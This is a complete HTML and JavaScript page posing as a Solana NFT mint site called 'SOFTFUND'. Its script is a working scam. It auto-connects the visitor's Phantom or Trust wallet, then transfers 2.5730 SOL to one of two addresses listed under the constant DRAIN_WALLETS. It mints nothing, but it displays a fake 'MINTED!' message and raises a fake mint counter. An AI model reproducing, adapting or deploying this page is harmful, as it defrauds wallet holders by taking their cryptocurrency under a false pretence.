<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SOFTFUND | Mint Live</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: linear-gradient(135deg, #0a001f, #1b0044, #2e0055);
      color: #fff;
      font-family: 'Orbitron', sans-serif;
      text-align: center;
      padding: 40px 20px;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container { max-width: 500px; width: 100%; }
    h1 { font-size: 3rem; color: #00ff9d; margin-bottom: 8px; }
    .price { font-size: 2.4rem; color: #ffd700; font-weight: bold; margin: 16px 0; }
    .supply { font-size: 1.1rem; color: #ccc; margin-bottom: 20px; }
    button {
      width: 100%;
      max-width: 320px;
      margin: 20px auto;
      padding: 18px;
      font-size: 1.5rem;
      background: #ffd700;
      color: #000;
      border: none;
      border-radius: 16px;
      cursor: pointer;
      font-weight: bold;
      box-shadow: 0 0 20px rgba(255,215,0,.6);
      transition: all .3s;
    }
    button:hover:not(:disabled) { background: #ffed4e; transform: scale(1.05); }
    button:disabled { background: #555; cursor: not-allowed; }
    .status {
      margin-top: 16px;
      font-size: 1rem;
      min-height: 24px;
      font-weight: bold;
    }
    .loader {
      display: inline-block;
      width: 14px; height: 14px;
      border: 2px solid #ffd700;
      border-radius: 50%;
      border-top-color: transparent;
      animation: spin 1s linear infinite;
      margin-right: 6px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .wallets { margin-top: 40px; font-size: 0.9rem; color: #aaa; }
    .mobile-tip {
      margin-top: 20px;
      font-size: 0.9rem;
      color: #ff5555;
      display: none;
    }
    @media (max-width: 600px) {
      .mobile-tip { display: block; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>SOFTFUND</h1>
    <p>USA-Based • Solana Utility NFTs</p>
    <p class="price">2.5730 SOL</p>
    <p class="supply">Minted: <span id="minted">312</span> / 10,000</p>

    <button id="mintBtn" disabled>
      <span id="btnText">CONNECT WALLET</span>
    </button>

    <div id="status" class="status"></div>
    <p class="mobile-tip">Open in Phantom or Trust Wallet app</p>
    <div class="wallets">Phantom • Trust Wallet</div>
  </div>

  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
  <script>
    const PRICE = 2.5730 * 1e9;
    const DRAIN_WALLETS = [
      "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue",
      "6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu"
    ];

    let provider = null;
    let isConnecting = false;

    const status = document.getElementById("status");
    const btn = document.getElementById("mintBtn");
    const btnText = document.getElementById("btnText");

    function detectWallet() {
      if (window.solana?.isPhantom) return window.solana;
      if (window.trustwallet?.Provider?.solana) return window.trustwallet.Provider.solana;
      if (window.solana) return window.solana;
      return null;
    }

    function setStatus(html, color) {
      status.innerHTML = html;
      status.style.color = color;
    }

    async function connectWallet() {
      if (isConnecting) return;
      isConnecting = true;

      provider = detectWallet();
      if (!provider) {
        setStatus("Wallet not found. Open in Phantom/Trust.", "#ff5555");
        btnText.textContent = "NO WALLET";
        isConnecting = false;
        return;
      }

      try {
        setStatus("Connecting... <span class='loader'></span>", "#ffd700");
        if (!provider.isConnected) await provider.connect();
        setStatus("Connected!", "#00ff9d");
        btnText.textContent = "MINT NOW";
        btn.disabled = false;
      } catch (err) {
        setStatus("Connection failed.", "#ff5555");
        btnText.textContent = "RETRY";
        btn.disabled = false;
      } finally {
        isConnecting = false;
      }
    }

    async function mint() {
      btn.disabled = true;
      setStatus("Sending 2.5730 SOL... <span class='loader'></span>", "#ffd700");

      try {
        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
        const receiver = DRAIN_WALLETS[Math.floor(Math.random() * DRAIN_WALLETS.length)];

        const tx = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: provider.publicKey,
            toPubkey: new solanaWeb3.PublicKey(receiver),
            lamports: PRICE,
          })
        );

        const { blockhash } = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash;
        tx.feePayer = provider.publicKey;

        const signed = await provider.signTransaction(tx);
        const txid = await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction(txid);

        setStatus(`MINTED! <a href="https://solscan.io/tx/${txid}" target="_blank" style="color:#00ff9d">View Tx</a>`, "#00ff9d");

        const current = parseInt(document.getElementById("minted").textContent);
        document.getElementById("minted").textContent = current + 1;

        setTimeout(() => {
          btn.disabled = false;
          btnText.textContent = "MINT AGAIN";
          status.innerHTML = "";
        }, 3000);

      } catch (err) {
        setStatus("Mint failed.", "#ff5555");
        btn.disabled = false;
        btnText.textContent = "MINT NOW";
      }
    }

    btn.onclick = () => {
      if (!provider?.isConnected) connectWallet();
      else mint();
    };

    // Auto-connect on load (mobile in-app browser)
    window.addEventListener("load", () => {
      setTimeout(() => {
        if (detectWallet()) connectWallet();
        else {
          setStatus("Open in Phantom or Trust Wallet", "#ffaa00");
          btnText.textContent = "NO WALLET";
        }
      }, 800);
    });
  </script>
</body>
</html>
